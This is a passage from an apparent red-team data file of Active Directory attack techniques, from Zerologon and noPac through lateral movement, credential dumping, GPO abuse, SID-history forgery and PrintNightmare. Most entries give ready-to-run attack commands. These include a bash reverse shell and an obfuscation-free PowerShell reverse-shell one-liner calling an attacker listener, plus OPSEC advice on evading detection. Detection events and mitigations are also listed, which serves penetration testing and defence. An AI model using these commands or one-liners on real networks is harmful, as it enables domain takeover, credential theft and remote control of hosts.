      "A cryptographic flaw in Netlogon's AES-CFB8 use lets an unauthenticated attacker with network access to a DC set its machine account password to empty, then DCSync to dump all hashes. Devastating but destructive: it breaks the DC secure channel until restored, so use with care.",
    tools: [
      { name: 'CVE-2020-1472 PoC (dirkjanm)', url: 'https://github.com/dirkjanm/CVE-2020-1472' },
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (zerologon)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Set DC machine password to empty', code: r`cve-2020-1472-exploit.py DC01 10.0.0.1`, lang: 'bash' },
      { label: 'DCSync with the empty machine account', code: r`secretsdump.py -just-dc -no-pass 'domain.local/DC01$@10.0.0.1'`, lang: 'bash' },
      { label: 'Check if the DC is vulnerable (NetExec, no creds)', code: r`nxc smb <dc-ip> -M zerologon`, lang: 'bash' },
    ],
    requires: ['Network access to an unpatched DC (pre Aug-2020 patch)'],
    versions: ['srv2008', 'srv2012', 'srv2016', 'srv2019'],
    affects: 'Server 2008 R2 through Server 2019 DCs (Netlogon, before the Aug-2020 patch); disclosed before Server 2022 shipped.',
    mitre: mitre('T1068'),
    opsec: 'High-signal: many anomalous Netlogon auths (4742/5805) and a DC password change. Emptying the DC password breaks replication, so always restore the original machine password afterward.',
    difficulty: 'medium',
  },
  {
    id: 'nopac',
    label: 'noPac (CVE-2021-42278/42287)',
    phase: 'priv-esc',
    summary: 'sAMAccountName spoofing -> impersonate a DC.',
    description:
      'Chaining CVE-2021-42278 (no validation of the trailing $ on a machine account name) and CVE-2021-42287 (KDC retries with a trailing $), a low-priv user creates a machine account, renames it to a DC name, gets a TGT, then drops the rename so S4U2self returns a ticket as a DC. Standard-user to Domain Admin in one chain.',
    tools: [
      { name: 'noPac', url: 'https://github.com/Ridter/noPac' },
      { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (nopac)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Scan and exploit', code: r`noPac.py domain.local/user:pass -dc-ip 10.0.0.1 -dc-host DC01 --impersonate Administrator -dump`, lang: 'bash' },
      { label: 'Check a DC for noPac (NetExec)', code: r`nxc smb <dc-ip> -u user -p pass -M nopac`, lang: 'bash' },
    ],
    requires: ['Any valid domain account', 'MachineAccountQuota > 0', 'Unpatched DC (pre Nov-2021 patch)'],
    versions: ['srv2012', 'srv2016', 'srv2019', 'srv2022'],
    affects: 'Server 2012 R2 through Server 2022 DCs, before the Nov-2021 patch (KB5008102 / KB5008380).',
    mitre: mitre('T1068'),
    references: [
      {
        label: 'exploit.ph, CVE-2021-42278/42287 weaponisation (Charlie Clark, original writeup)',
        url: 'https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html',
      },
      {
        label: 'Microsoft KB5008102, SAM hardening (CVE-2021-42278)',
        url: 'https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e',
      },
    ],
    opsec: 'Machine-account creation/rename (4741/4781) and DC-name collisions are detectable. Setting MachineAccountQuota to 0 and patching close the path.',
    difficulty: 'medium',
  },
  {
    id: 'winrm-evil',
    label: 'WinRM Execution',
    phase: 'lateral-movement',
    summary: 'Interactive shell over WinRM (5985/5986).',
    description:
      'With credentials/hash and the target Remote Management Users membership, evil-winrm gives an interactive PowerShell session over WinRM. Cleaner than service-based exec and supports pass-the-hash and Kerberos auth.',
    tools: [
      { name: 'evil-winrm', url: 'https://github.com/Hackplayers/evil-winrm' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Connect with a password', code: r`evil-winrm -i 10.0.0.20 -u Administrator -p 'Passw0rd!'`, lang: 'bash' },
      { label: 'Connect via pass-the-hash', code: r`evil-winrm -i 10.0.0.20 -u Administrator -H <NTHASH>`, lang: 'bash' },
    ],
    requires: ['Local admin or Remote Management Users membership', 'WinRM enabled (5985/5986)'],
    mitre: mitre('T1021.006'),
    opsec: 'WinRM logons create 4624 type-3 events and PowerShell/WinRM operational logs; script-block logging captures commands. Blend with admin activity windows.',
    difficulty: 'easy',
    references: [
      { label: 'HackTricks, WinRM (Lateral Movement)', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/winrm.html' },
    ],
  },
  {
    id: 'wmiexec',
    label: 'WMI Exec',
    phase: 'lateral-movement',
    summary: 'Semi-interactive exec over WMI (135/DCOM).',
    description:
      "Impacket's wmiexec runs commands via WMI over DCOM/RPC, returning output through a temp file on ADMIN$: no service is created, so it is quieter than psexec. Supports pass-the-hash and Kerberos.",
    tools: [
      { name: 'wmiexec (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Semi-interactive WMI shell', code: r`wmiexec.py domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
      { label: 'Pass-the-hash', code: r`wmiexec.py -hashes :<NTHASH> domain.local/Administrator@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'RPC/DCOM (135) + SMB (445) reachable'],
    mitre: mitre('T1047'),
    opsec: 'No service event (quieter than psexec), but WMI process creation, the ADMIN$ temp file, and 4624 type-3 logons are detectable. Defenders flag wmiexec command-line patterns.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, WmiExec (Lateral Movement)', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/wmiexec.html' },
    ],
  },
  {
    id: 'dcom-exec',
    label: 'DCOM Exec',
    phase: 'lateral-movement',
    summary: 'Code execution via DCOM objects (e.g. MMC20).',
    description:
      'Certain DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow) expose methods that spawn processes, allowing remote execution over DCOM/RPC. A less-monitored alternative when SMB/WMI exec are blocked.',
    tools: [{ name: 'dcomexec (Impacket)', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Exec via a DCOM object', code: r`dcomexec.py -object MMC20 domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'DCOM/RPC (135 + dynamic ports) reachable'],
    mitre: mitre('T1021.003'),
    opsec: 'DCOM lateral movement is less commonly monitored but leaves a child process under a COM host and 4624 type-3 logons. Object availability varies by Windows version.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, DCOMExec (Lateral Movement)', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/dcomexec.html' },
    ],
  },
  {
    id: 'psexec',
    label: 'PsExec / Service Exec',
    phase: 'lateral-movement',
    summary: 'SYSTEM shell via a service over SMB (445).',
    description:
      "The loud-but-reliable classic: drop a binary to ADMIN$ and register + start a Windows service through the SCM over SMB/RPC, running as SYSTEM. Sysinternals PsExec and Impacket's psexec.py both hand you a full interactive SYSTEM shell; both support pass-the-hash and Kerberos.",
    tools: [
      { name: 'psexec (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'Sysinternals PsExec', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/psexec' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'SYSTEM shell with a password', code: r`psexec.py domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
      { label: 'Pass-the-hash', code: r`psexec.py -hashes :<NTHASH> domain.local/Administrator@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'SMB (445) + ADMIN$ reachable'],
    mitre: mitre('T1021.002'),
    opsec: 'The loudest of the exec family: a service install (Security 7045 / System 7045) plus the dropped binary on ADMIN$. EDR flags the PSEXESVC pattern, so prefer wmiexec or atexec when stealth matters.',
    difficulty: 'easy',
    references: [
      { label: 'HackTricks, PsExec / WinExec', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/psexec-and-winexec.html' },
    ],
  },
  {
    id: 'smbexec',
    label: 'SMBExec',
    phase: 'lateral-movement',
    summary: 'Semi-interactive SMB shell, no binary dropped.',
    description:
      "Impacket's smbexec spawns a temporary service that runs each command through cmd.exe and pipes the output back over SMB: nothing is written to disk as a payload binary, sidestepping the PsExec exe drop. Runs as SYSTEM and supports pass-the-hash; the trade-off is a service created per command.",
    tools: [
      { name: 'smbexec (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Semi-interactive SYSTEM shell', code: r`smbexec.py domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
      { label: 'Pass-the-hash', code: r`smbexec.py -hashes :<NTHASH> domain.local/Administrator@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'SMB (445) reachable'],
    mitre: mitre('T1021.002'),
    opsec: 'No payload binary on disk, but a service is created per command (repeated 7045), noisy in the event log even though ADMIN$ stays clean. Defenders signature the smbexec service-name/command pattern.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, PsExec / SMBExec family', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/psexec-and-winexec.html' },
      { label: 'Impacket, smbexec.py source', url: 'https://github.com/fortra/impacket/blob/master/examples/smbexec.py' },
    ],
  },
  {
    id: 'atexec',
    label: 'Scheduled-Task Exec',
    phase: 'lateral-movement',
    summary: 'Run as SYSTEM via a remote scheduled task.',
    description:
      "Impacket's atexec registers a one-shot scheduled task through the Task Scheduler service (ATSVC over RPC/SMB), runs it as SYSTEM, captures the output, and deletes the task: no service install, so it is quieter than PsExec. A solid fallback when service-based exec is blocked or closely watched.",
    tools: [
      { name: 'atexec (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Run a command as SYSTEM', code: r`atexec.py domain.local/Administrator:'Passw0rd!'@10.0.0.20 whoami`, lang: 'bash' },
      { label: 'Pass-the-hash', code: r`atexec.py -hashes :<NTHASH> domain.local/Administrator@10.0.0.20 whoami`, lang: 'bash' },
    ],
    requires: ['Local admin on the target', 'RPC (135) + SMB (445) reachable'],
    mitre: mitre('T1053.005'),
    opsec: 'Task create/delete logs to Security 4698/4699 and the TaskScheduler operational log. No service event and no binary drop, so quieter than PsExec, but scheduled-task artifacts are well-monitored.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, AtExec', url: 'https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/atexec.html' },
    ],
  },
  {
    id: 'rdp-lateral',
    label: 'RDP',
    phase: 'lateral-movement',
    summary: 'Interactive desktop over RDP (3389).',
    description:
      'Log in to a full interactive desktop with a password, or with just an NT hash via Restricted Admin mode (pass-the-hash over RDP). Needs only Remote Desktop Users membership or local admin on that host, so you may land as a non-admin user. Useful to reach GUI-only tooling or ride an existing session.',
    tools: [
      { name: 'xfreerdp (FreeRDP)', url: 'https://github.com/FreeRDP/FreeRDP' },
      { name: 'NetExec (rdp)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'SharpRDP', url: 'https://github.com/0xthirteen/SharpRDP' },
    ],
    commands: [
      { label: 'Connect with a password', code: r`xfreerdp /v:10.0.0.20 /u:Administrator /p:'Passw0rd!' +clipboard`, lang: 'bash' },
      { label: 'Pass-the-hash (Restricted Admin)', code: r`xfreerdp /v:10.0.0.20 /u:Administrator /pth:<NTHASH>`, lang: 'bash' },
    ],
    requires: ['Remote Desktop Users membership or local admin', 'RDP (3389) reachable', 'Restricted Admin mode enabled for pass-the-hash'],
    mitre: mitre('T1021.001'),
    opsec: 'A type-10 interactive logon (4624) the console user can literally see, plus rich artifacts (bitmap cache, RDP operational logs). Restricted Admin must be enabled host-side for PtH and itself weakens the target.',
    difficulty: 'easy',
    references: [
      { label: 'HackTricks, Pentesting RDP', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html' },
    ],
  },
  {
    id: 'ssh-lateral',
    label: 'SSH',
    phase: 'lateral-movement',
    summary: 'Shell over SSH (22): Linux & OpenSSH hosts.',
    description:
      'In mixed estates SSH is a first-class lateral channel: Linux servers, network appliances, hypervisors, and Windows hosts running OpenSSH. Authenticate with reused passwords, recovered private keys, or (on domain-joined Linux) Kerberos/GSSAPI. Any account allowed to log in works; you need not be an admin (escalate locally afterward if not).',
    tools: [
      { name: 'OpenSSH client', url: 'https://www.openssh.com/' },
      { name: 'NetExec (ssh)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'Ncat', url: 'https://nmap.org/ncat/' },
    ],
    commands: [
      { label: 'Authenticate with a recovered key', code: r`ssh -i id_rsa svc_backup@10.0.0.50`, lang: 'bash' },
      { label: 'Spray reused creds across hosts', code: r`nxc ssh hosts.txt -u users.txt -p passwords.txt --continue-on-success`, lang: 'bash' },
    ],
    requires: ['A valid SSH login on the target: password, private key, or Kerberos', 'SSH (22) reachable'],
    mitre: mitre('T1021.004'),
    opsec: 'Logs to auth.log / sshd (and the Windows OpenSSH operational log). Key-based reuse blends in and often survives password rotations. Hunt for private keys on every host you own.',
    difficulty: 'easy',
    references: [
      { label: 'HackTricks, Pentesting SSH', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html' },
      { label: 'HighOn.Coffee, SSH Lateral Movement Cheat Sheet', url: 'https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/' },
    ],
  },
  {
    id: 'reverse-shell',
    label: 'Reverse / Bind Shell',
    phase: 'lateral-movement',
    summary: 'Turn one-shot exec into an interactive session.',
    description:
      'When the execution primitive is one-shot or non-interactive (a single wmiexec/atexec command, a web shell, MSSQL xp_cmdshell, an Office macro) or inbound ports are firewalled, drop a payload that connects back to your listener for an interactive shell (a bind shell is the ingress-allowed inverse). Pick a one-liner that matches the target runtime: PowerShell, cmd, bash, python, or nc.',
    tools: [
      { name: 'revshells.com', url: 'https://www.revshells.com/' },
      { name: 'msfvenom (Metasploit)', url: 'https://github.com/rapid7/metasploit-framework' },
      { name: 'Ncat', url: 'https://nmap.org/ncat/' },
    ],
    commands: [
      { label: 'Catch the shell (listener)', code: r`nc -lvnp 443`, lang: 'bash' },
      { label: 'Linux bash reverse', code: r`bash -i >& /dev/tcp/10.0.0.66/443 0>&1`, lang: 'bash' },
      { label: 'PowerShell reverse one-liner', code: r`powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.66',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1|Out-String));$s.Write($sb,0,$sb.Length);$s.Flush()}"`, lang: 'powershell' },
    ],
    requires: ['Any command-execution primitive on the target', 'An outbound path (reverse) or open inbound port (bind) to your listener'],
    mitre: mitre('T1059'),
    opsec: 'An outbound connection to an attacker IP/port and a shell-spawning parent (w3wp/sqlservr → powershell) are prime EDR signals. Use common ports (443), encrypt where you can, and avoid stock one-liners that signatures already know.',
    difficulty: 'easy',
    references: [
      { label: 'PayloadsAllTheThings, Reverse Shell Cheatsheet', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' },
      { label: 'HackTricks, Windows Reverse Shells', url: 'https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html' },
    ],
  },
  {
    id: 'user-foothold',
    label: 'User-Context Foothold',
    phase: 'lateral-movement',
    hub: true, // convergence point: every "shell as some user/service account" lands here
    summary: 'Operate as the authenticating user: their privileges, identity, and secrets.',
    description:
      "A shell running as whatever account the access landed you on, carrying exactly ITS privileges, which may or may not be local admin. This is where most exec channels actually drop you: WinRM/RDP as a remote-access-group user, a caught reverse shell, web/app RCE as the IIS app-pool or a service account, xp_cmdshell as the SQL service account, a hijacked user's session. Run `whoami /groups` (or `id`) to see what you really hold. The account may be a plain user, a privileged one, or a (often domain) service account. Either way you inherit its identity and group memberships, so move laterally AS it and loot its secrets. If it isn't already local admin, escalate locally (SeImpersonate/potato, etc.) to admin / SYSTEM; if it's a domain account, wield its domain identity.",
    tools: [{ name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' }],
    commands: [
      { label: 'Check what this account actually has', code: r`whoami /groups & whoami /priv & whoami /upn`, lang: 'cmd' },
    ],
    requires: ['Code execution as a user on the host'],
    mitre: mitre('T1078'),
    opsec: 'Operating as the legitimate user is quiet: their logons and process activity are expected. The tell is a privileged account suddenly running recon, or a burst of escalation attempts from a normal user.',
    difficulty: 'easy',
    references: [
      { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' },
    ],
  },
  {
    id: 'sam-lsa-dump',
    label: 'SAM & LSA Secrets Dump',
    phase: 'credential-access',
    summary: 'Pull local hashes, cached creds, and LSA secrets.',
    description:
      'With SYSTEM/local admin you can dump the local SAM (local account hashes), cached domain credentials (MSCACHE), and LSA secrets (service-account / machine-account passwords): either save the registry hives and parse offline, or read them directly with secretsdump. A reliable credential source that never touches LSASS memory.',
    tools: [
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Save registry hives', code: r`reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save & reg save HKLM\SECURITY security.save`, lang: 'cmd' },
      { label: 'Parse local hives offline', code: r`secretsdump.py -sam sam.save -system system.save -security security.save LOCAL`, lang: 'bash' },
      { label: 'Remote dump with creds', code: r`secretsdump.py domain.local/Administrator:'Passw0rd!'@10.0.0.20`, lang: 'bash' },
    ],
    requires: ['Local admin / SYSTEM on the host (or admin creds for remote)'],
    mitre: mitre('T1003.002'),
    opsec: 'reg save of SAM/SECURITY and remote secretsdump (creates a service for some methods, 7045) are monitored. LSA secrets often yield a service or machine account, quieter than LSASS dumping.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, Stealing Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html' },
    ],
  },
  {
    id: 'laps-read',
    label: 'Read LAPS Password',
    phase: 'credential-access',
    summary: 'Read the LAPS-managed local admin password from AD.',
    description:
      'LAPS stores each host\'s rotated local administrator password in AD: legacy LAPS in the cleartext ms-Mcs-AdmPwd attribute, Windows LAPS (April 2023+) in msLAPS-Password (JSON) or the AES-256 msLAPS-EncryptedPassword. Any principal granted the confidential read right (CONTROL_ACCESS / All-Extended-Rights, surfaced in BloodHound as ReadLAPSPassword) can recover the password and log in as local admin on that host.',
    tools: [
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'pyLAPS', url: 'https://github.com/p0dalirius/pyLAPS' },
      { name: 'LAPSDumper', url: 'https://github.com/n00py/LAPSDumper' },
    ],
    commands: [
      { label: 'Read LAPS via NetExec', code: r`nxc smb 10.0.0.1 -u user -p pass --laps`, lang: 'bash' },
      { label: 'Read LAPS module over LDAP', code: r`nxc ldap dc01 -d domain.local -u user -p pass -M laps`, lang: 'bash' },
      { label: 'Read with pyLAPS', code: r`pyLAPS.py --action get -d domain.local -u user -p pass --dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['A principal with the LAPS read right over the target computer', 'LAPS deployed in the domain'],
    references: [
      { label: 'HackTricks, LAPS', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html' },
      { label: 'The Hacker Recipes, ReadLAPSPassword', url: 'https://www.thehacker.recipes/ad/movement/dacl/readlapspassword' },
      { label: 'NetExec wiki, Defeating LAPS', url: 'https://www.netexec.wiki/smb-protocol/defeating-laps' },
    ],
    opsec: 'Reading the password attribute is an LDAP query (directory-read; 4662 when SACLs are configured) and does not rotate the password. The recovered password is valid until the next LAPS rotation interval.',
    difficulty: 'easy',
  },
  {
    id: 'gmsa-read',
    label: 'Read gMSA Password',
    phase: 'credential-access',
    summary: 'Read msDS-ManagedPassword to derive a gMSA NT hash.',
    description:
      'A Group Managed Service Account\'s password is computed by the KDC and exposed in the msDS-ManagedPassword blob. Principals listed in msDS-GroupMSAMembership (BloodHound: ReadGMSAPassword) can read that blob and derive the account\'s NT hash (and AES keys), then pass-the-hash or overpass-the-hash as the gMSA, which is often a privileged service identity.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'gMSADumper', url: 'https://github.com/micahvandeusen/gMSADumper' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Dump gMSA password/hash', code: r`gMSADumper.py -u user -p pass -d domain.local`, lang: 'bash' },
      { label: 'Read gMSA via NetExec (LDAPS)', code: r`nxc ldap dc01 -d domain.local -u user -p pass --gmsa`, lang: 'bash' },
      { label: 'Grant yourself retrieval rights first (GenericAll)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add gmsaGroup '<gMSA$>' '<attacker>'`, lang: 'bash' },
    ],
    requires: ['Membership in the gMSA\'s msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword), or GenericAll to grant it', 'LDAPS reachable (NetExec --gmsa requires it)'],
    versions: ['srv2012', 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
    affects: 'gMSAs require a Server 2012+ DC (the KDS root key and msDS-ManagedPassword arrived in Server 2012).',
    references: [
      { label: 'The Hacker Recipes, ReadGMSAPassword', url: 'https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword' },
      { label: 'NetExec wiki, Dump gMSA', url: 'https://www.netexec.wiki/ldap-protocol/dump-gmsa' },
    ],
    opsec: 'The managed-password read is an LDAP query; Windows refuses to return the blob over cleartext LDAP, so retrieval typically forces LDAPS. The derived hash stays valid until the gMSA rotates (default 30 days).',
    difficulty: 'easy',
  },
  {
    id: 'gpo-abuse',
    label: 'GPO Abuse',
    phase: 'priv-esc',
    summary: 'Edit a writable GPO -> immediate task / local admin on linked hosts.',
    description:
      'With edit rights (GenericWrite/WriteDacl/WriteProperty, BloodHound: GenericWrite over a GPO) you can modify a Group Policy Object\'s files in SYSVOL. Inject an immediate scheduled task or add a local administrator; the change applies as SYSTEM (computer policy) to every computer the GPO is linked to (potentially an OU full of servers or even Domain Controllers), turning one ACL into domain-wide code execution.',
    tools: [
      { name: 'SharpGPOAbuse', url: 'https://github.com/ReversecLabs/SharpGPOAbuse' },
      { name: 'pyGPOAbuse', url: 'https://github.com/Hackndo/pyGPOAbuse' },
    ],
    commands: [
      { label: 'Add a local admin (SharpGPOAbuse)', code: r`SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"`, lang: 'powershell' },
      { label: 'Immediate computer task (SharpGPOAbuse)', code: r`SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net user ..." --GPOName "Vulnerable GPO"`, lang: 'powershell' },
      { label: 'Add local admin from Linux (pyGPOAbuse)', code: r`pygpoabuse.py domain.local/user -hashes :<NTHASH> -gpo-id <GPO-GUID>`, lang: 'bash' },
    ],
    requires: ['Edit rights (GenericWrite/WriteDacl/WriteProperty) over a GPO', 'The GPO linked to a useful OU/computer'],
    mitre: mitre('T1484.001'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, A Red Teamer\'s Guide to GPOs and OUs', url: 'https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e' },{ label: 'The Hacker Recipes, Group policies', url: 'https://www.thehacker.recipes/ad/movement/group-policies' }],
    opsec: 'Writing to SYSVOL changes gPCMachineExtensionNames and the policy files (5136 / file-share auditing); an immediate task triggers gpupdate followed by an unexpected scheduled task and a child process. Remove the task and revert the GPO after use.',
    difficulty: 'medium',
  },
  {
    id: 'gpp-cpassword',
    label: 'GPP cPassword (MS14-025)',
    phase: 'credential-access',
    summary: 'Decrypt cpassword from SYSVOL Groups.xml to cleartext.',
    description:
      'Group Policy Preferences could push credentials (e.g. a local admin set via Groups.xml, or scheduled-task/service/mapped-drive creds). The password is stored in a cpassword attribute encrypted with a 32-byte AES key Microsoft published in MSDN, so any authenticated domain user who can read SYSVOL can decrypt it to cleartext. MS14-025 stopped new GPP credentials but left existing XML in place.',
    tools: [
      { name: 'Get-GPPPassword (PowerSploit)', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'gpp-decrypt', url: 'https://github.com/t0thkr1s/gpp-decrypt' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Find & decrypt GPP creds (NetExec)', code: r`nxc smb 10.0.0.1 -u user -p pass -M gpp_password`, lang: 'bash' },
      { label: 'Hunt GPP passwords (PowerSploit)', code: r`Get-GPPPassword`, lang: 'powershell' },
      { label: 'Decrypt a known cpassword', code: r`gpp-decrypt.py -c <cpassword>`, lang: 'bash' },
    ],
    requires: ['Read access to SYSVOL (any authenticated domain user)', 'A legacy GPP XML still containing cpassword'],
    mitre: mitre('T1552.006'),
    references: [{ label: 'MITRE ATT&CK T1552.006', url: 'https://attack.mitre.org/techniques/T1552/006/' }],
    opsec: 'SYSVOL reads are normal domain traffic and decryption is fully offline, so this is very low-signal. Modern, well-patched domains have usually purged GPP cpassword files.',
    difficulty: 'easy',
  },
  {
    id: 'trust-sid-history',
    label: 'Trust / SID History (Child -> Forest)',
    phase: 'domain-dominance',
    summary: 'Forge a ticket with the Enterprise Admins SID via sidHistory.',
    description:
      'Within a single forest there is no SID filtering on intra-forest trusts, so the sidHistory / ExtraSids field of a ticket is honored across the trust. With the child domain\'s krbtgt key, forge an inter-realm or golden ticket whose ExtraSids contains the root domain\'s Enterprise Admins SID (<root-SID>-519); the parent KDC treats you as an Enterprise Admin, escalating from child Domain Admin to full forest compromise.',
    tools: [
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'raiseChild (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Forge ticket with EA ExtraSid', code: r`ticketer.py -nthash <CHILD_KRBTGT> -domain-sid <CHILD_SID> -domain child.domain.local -extra-sid <ROOT_SID>-519 Administrator`, lang: 'bash' },
      { label: 'Automate child -> parent', code: r`raiseChild.py child.domain.local/childadmin:pass`, lang: 'bash' },
    ],
    requires: ['Domain Admin / krbtgt key of the child domain', 'A child domain within the target forest'],
    mitre: mitre('T1134.005'),
    references: [
      { label: 'harmj0y, A Guide to Attacking Domain Trusts', url: 'https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/' },{ label: 'HackTricks, SID-History Injection', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/sid-history-injection.html' }],
    opsec: 'A forged golden TGT containing a high-privilege ExtraSid is detectable by the same anomalies as golden tickets (no preceding AS-REQ, odd lifetime/etype). Enabling SID filtering / quarantine on the trust breaks the path.',
    difficulty: 'hard',
  },
  {
    id: 'printnightmare',
    label: 'PrintNightmare (CVE-2021-34527)',
    phase: 'priv-esc',
    summary: 'Print Spooler driver load -> code execution as SYSTEM.',
    description:
      'A flaw in the Print Spooler (RpcAddPrinterDriverEx / AddPrinterDriver) lets an authenticated user supply a malicious driver DLL that the spooler loads as SYSTEM. CVE-2021-1675 is the local LPE; CVE-2021-34527 extends it to remote code execution against any host (including a DC) running the Spooler. Drop a DLL on a share, point the spooler at it, and you execute as SYSTEM.',
    tools: [
      { name: 'CVE-2021-1675 (cube0x0)', url: 'https://github.com/cube0x0/CVE-2021-1675' },
      { name: 'Invoke-Nightmare (calebstewart)', url: 'https://github.com/calebstewart/CVE-2021-1675' },
      { name: 'NetExec (printnightmare)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Remote exploit via a DLL share', code: r`CVE-2021-1675.py domain.local/user:pass@10.0.0.10 '\\10.0.0.50\share\evil.dll'`, lang: 'bash' },
      { label: 'Local LPE (add local admin)', code: r`Invoke-Nightmare -NewUser hacker -NewPassword 'Passw0rd!'`, lang: 'powershell' },
      { label: 'Check spooler + vulnerability (NetExec)', code: r`nxc smb <host> -u user -p pass -M printnightmare`, lang: 'bash' },
    ],
    requires: ['The Print Spooler service running on the target', 'A valid domain account (remote) or local user (LPE)', 'Unpatched host (pre July-2021 OOB update)'],
    versions: ['srv2008', 'srv2012', 'srv2016', 'srv2019', 'srv2022'],
    affects: 'Print Spooler on Server 2008 R2 through Server 2022, before the July-2021 out-of-band update; disclosed before Server 2025 shipped.',
    mitre: mitre('T1068'),
    opsec: 'Spooler driver loads and the new DLL under the spool drivers path are detectable (RpcAddPrinterDriverEx, 808/4688 events). Disabling the Print Spooler where it is not needed fully mitigates it.',
    difficulty: 'medium',
    references: [
      { label: 'HackTricks, PrintNightmare', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printnightmare.html' },
    ],
  },
  {
    id: 'skeleton-key',
    label: 'Skeleton Key',
    phase: 'persistence',
    summary: 'Patch LSASS on a DC -> master password for every account.',
    description:
      'mimikatz misc::skeleton patches LSASS on a Domain Controller so that, alongside each account\'s real password, a single master password ("mimikatz" by default) authenticates as any domain user. It is an in-memory patch: it survives until the DC reboots and downgrades affected auth to RC4_HMAC, so it is fast but volatile persistence.',
